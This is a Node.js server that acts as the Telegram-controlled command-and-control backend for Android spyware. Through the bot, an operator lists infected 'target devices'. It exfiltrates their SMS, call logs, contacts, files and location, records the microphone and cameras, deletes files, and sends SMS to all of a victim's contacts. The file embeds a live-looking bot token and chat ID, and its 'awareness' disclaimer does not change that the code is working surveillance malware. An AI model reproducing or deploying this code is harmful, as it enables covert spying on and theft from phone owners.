const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid");
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");

const token = '8227291696:AAGOEXO9PGWB3mgU6OrbN5JSet70pqR-iPI'
const id = '7604667042'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer();
app.use(bodyParser.json());

let currentUuid = "";
let currentNumber = "";
let currentTitle = "";

app.get("/", function (req, res) {
    res.send("<h1 align=\"center\">تم تحميل الخادم بنجاح</h1>");
});

app.post("/uploadFile", upload.single("file"), (req, res) => {
    const filename = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `• رسالة من <b>${req.headers.model}</b> جهاز`,
        parse_mode: "HTML"
    }, { filename: filename, contentType: "application/txt" });
    res.send("");
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `• رسالة من <b>${req.headers.model}</b> جهاز\n\n` + req.body.text, { parse_mode: "HTML" });
    res.send("");
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon);
    appBot.sendMessage(id, `• الموقع من <b>${req.headers.model}</b> جهاز`, { parse_mode: "HTML" });
    res.send("");
});

appSocket.on("connection", (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model;
    const battery = req.headers.battery;
    const version = req.headers.version;
    const brightness = req.headers.brightness;
    const provider = req.headers.provider;
    ws.uuid = uuid;
    appClients.set(uuid, { model: model, battery: battery, version: version, brightness: brightness, provider: provider });
    appBot.sendMessage(id, `• جهاز جديد متصل✅\n\n` +
        `•  طراز الجهاز📱 : <b>${model}</b>\n` +
        `• بطارية 🔋 : <b>${battery}</b>\n` +
        `• نسخة أندرويد : <b>${version}</b>\n` +
        `• سطوع الشاشة  : <b>${brightness}</b>\n` +
        `• نوع الشرائح SIM : <b>${provider}</b>`, { parse_mode: "HTML" });
    ws.on("close", function () {
        appBot.sendMessage(id, `• الجهاز غير متصل ❎\n\n` +
            `•  طراز الجهاز📱 : <b>${model}</b>\n` +
            `• بطارية 🔋 : <b>${battery}</b>\n` +
            `• نسخة أندرويد : <b>${version}</b>\n` +
            `• سطوع الشاشة  : <b>${brightness}</b>\n` +
            `• نوع الشرائح SIM : <b>${provider}</b>`, { parse_mode: "HTML" });
        appClients.delete(ws.uuid);
    });
});

appBot.on("message", (msg) => {
    const chatId = msg.chat.id;
    if (msg.reply_to_message) {
        if (msg.reply_to_message.text.includes("يرى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه")) {
            currentNumber = msg.text;
            appBot.sendMessage(id, "• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه" + "• رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم", { reply_markup: { force_reply: true } });
        };
        if (msg.reply_to_message.text.includes("You will receive a response in the next few moments")) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${msg.text}`)
                }
            });
            currentNumber = "";
            currentUuid = "";
            appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
        };
        if (msg.reply_to_message.text.includes("أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال")) {
            const message = msg.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message}`)
                }
            });
            currentUuid = "";
            appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
        };
        if (msg.reply_to_message.text.includes("أدخل مسار الملف الذي تريد تنزيله")) {
            const filePath = msg.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${filePath}`)
                }
            });
            currentUuid = "";
            appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
        };
        if (msg.reply_to_message.text.includes("أدخل مسار الملف الذي تريد حذف")) {
            const filePath = msg.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${filePath}`)
                }
            });
            currentUuid = "";
            appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
        };
        if (msg.reply_to_message.text.includes("أدخل المدة التي تريد تسجيل الميكروفون فيها")) {
            const duration = msg.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = "";
            appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
        };
        if (msg.reply_to_message.text.includes("أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها")) {
            const duration = msg.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = "";
            appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
        };
        if (msg.reply_to_message.text.includes("أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها")) {
            const duration = msg.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = "";
            appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
        };
        if (msg.reply_to_message.text.includes("أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف")) {
            const message = msg.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${message}`)
                }
            });
            currentUuid = "";
            appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
        };
        if (msg.reply_to_message.text.includes("• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار")) {
            const url = msg.text;
            currentTitle = url;
            appBot.sendMessage(id, "• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار" + "• When the victim clicks on the notification, the link will be opened, the link you are entering will be opened in the target device in the next notification", { reply_markup: { force_reply: true } });
        };
        if (msg.reply_to_message.text.includes("أدخل رابط الصوت الذي تريد تشغيله")) {
            const audioUrl = msg.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${currentTitle}/${audioUrl}`)
                }
            });
            currentUuid = "";
            appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
        };
    };
    if (id == chatId) {
        if (msg.text == "/start") {
            appBot.sendMessage(id, "• • مرحبا بك في بوت اختراق 👋\n\n" + "• رجاء عدم استعمال البوت فيما يغضب  الله.هذا البوت غرض التوعية وحماية نفسك من الاختراق\n\n" + "• ترجمه البوت بقيادة ( @king_1_4 )  »طوفان الأقصى⬟﷽\n\n" + "• قناتي تليجرا  t.me/Abu_Yamani\n\n" + "• اضغط هن( /start )  ", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
        };
        if (msg.text == "📱الأجهزة المتصلة") {
            if (appClients.size == 0) {
                appBot.sendMessage(id, "• لا تتوفر أجهزة توصيل ❎\n\n" + "• Make sure the application is installed on the target device")
            } else {
                let devicesList = "• قائمة الأجهزة المتصلة🤖 :\n\n";
                appClients.forEach(function (value, key, map) {
                    devicesList += `•  طراز الجهاز📱 : <b>${value.model}</b>\n` +
                        `• بطارية 🔋 : <b>${value.battery}</b>\n` +
                        `• نسخة أندرويد : <b>${value.version}</b>\n` +
                        `• سطوع الشاشة  : <b>${value.brightness}</b>\n` +
                        `• نوع الشرائح SIM : <b>${value.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, devicesList, { parse_mode: "HTML" })
            }
        };
        if (msg.text == "⚙️قائمة الأوامر") {
            if (appClients.size == 0) {
                appBot.sendMessage(id, "• لا تتوفر أجهزة توصيل ❎\n\n" + "• Make sure the application is installed on the target device")
            } else {
                const buttons = [];
                appClients.forEach(function (value, key, map) {
                    buttons.push([{ text: value.model, callback_data: "device:" + key }])
                });
                appBot.sendMessage(id, "• حدد الجهاز لتنفيذ الأثناء", { "reply_markup": { "inline_keyboard": buttons } })
            }
        }
    } else {
        appBot.sendMessage(id, "• تم رفض الإذن")
    }
});

appBot.on("callback_query", (callback) => {
    const message = callback.message;
    const data = callback.data;
    const action = data.split(":")[0];
    const uuid = data.split(":")[1];
    console.log(uuid);
    if (action == "device") {
        appBot.editMessageText(`• حدد الجهاز لتنفيذ الأثناء : <b>${appClients.get(data.split(":")[1]).model}</b>`, {
            width: 10000, chat_id: id, message_id: message.message_id, reply_markup: {
                inline_keyboard: [
                    [{ text: "📱تطبيقات", callback_data: `apps:${uuid}` }, { text: "ℹ️معلومات الجهاز", callback_data: `device_info:${uuid}` }],
                    [{ text: "📂الحصول على ملف", callback_data: `file:${uuid}` }, { text: "🗂حذف الملف", callback_data: `delete_file:${uuid}` }],
                    [{ text: "🎤ميكروفون", callback_data: `microphone:${uuid}` }, { text: "📷الكاميرا الرئيسية", callback_data: `rec_camera_main:${uuid}` }],
                    [{ text: "📸كاميرا السيلفي", callback_data: `rec_camera_selfie:${uuid}` }, { text: "📍الموقع", callback_data: `location:${uuid}` }],
                    [{ text: "📞المكالمات", callback_data: `calls:${uuid}` }, { text: "📒جهات الاتصال", callback_data: `contacts:${uuid}` }],
                    [{ text: "💬رسائل", callback_data: `messages:${uuid}` }, { text: "📩إرسال رسالة", callback_data: `send_message:${uuid}` }],
                    [{ text: "🔊تشغيل الصوت", callback_data: `play_audio:${uuid}` }, { text: "🔇إيقاف الصوت", callback_data: `stop_audio:${uuid}` }],
                    [{ text: "📨إرسال رسالة إلى جميع جهات الاتصال ", callback_data: `send_message_to_all:${uuid}` }]
                ]
            }, parse_mode: "HTML"
        })
    };
    if (action == "apps") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("apps")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "device_info") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("device_info")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "calls") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("calls")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "contacts") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("contacts")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "messages") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("messages")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "clipboard") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("clipboard")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "camera_main") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("camera_main")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "camera_selfie") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("camera_selfie")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "location") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("location")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "vibrate") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("vibrate")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "stop_audio") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("stop_audio")
            }
        });
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• طلبك قيد المعالجة\n\n" + "• You will receive a response in the next few moments", { parse_mode: "HTML", "reply_markup": { "keyboard": [["📱الأجهزة المتصلة"], ["⚙️قائمة الأوامر"]], 'resize_keyboard': true } });
    };
    if (action == "send_message") {
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه\n\n" + "• If you want to send a message to a local number, you can enter the number with the country code at the beginning, otherwise the number will be sent with the country code in the target device", { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    };
    if (action == "send_message_to_all") {
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n" + "• You do not need to enter the number to send a message to all contacts, just enter the message that will be sent to all contacts in the target device", { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    };
    if (action == "file") {
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• أدخل مسار الملف الذي تريد تنزيله \n\n" + "• You do not need to enter the full file path, just enter the main path. For example, enter <b> DCIM/Camera </b> to receive gallery files.", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
        currentUuid = uuid;
    };
    if (action == "delete_file") {
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• أدخل مسار الملف الذي تريد حذفه\n\n" + "• You do not need to enter the full file path, just enter the main path. For example, enter <b> DCIM/Camera </b> to delete gallery files.", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
        currentUuid = uuid;
    };
    if (action == "microphone") {
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n" + "• Note that you must enter the time in units of seconds only", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
        currentUuid = uuid;
    };
    if (action == "toast") {
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n\n" + "• Toast is a short message that appears on the device screen for a few seconds", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
        currentUuid = uuid;
    };
    if (action == "show_notification") {
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n" + "• Your message will be appear in the target device status bar like regular notification", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
        currentUuid = uuid;
    };
    if (action == "play_audio") {
        appBot.deleteMessage(id, message.message_id);
        appBot.sendMessage(id, "• أدخل رابط الصوت الذي تريد تشغيله\n\n" + "• Note that you must enter the direct link to the sound, otherwise the sound will not be played. For example, enter the link that ends with .mp3", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
        currentUuid = uuid;
    };
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send("ping")
    });
    try {
        axios.get(address).then((res) => {
            return ""
        })
    } catch (e) { }
}, 5000);

appServer.listen(process.env.PORT || 8999);
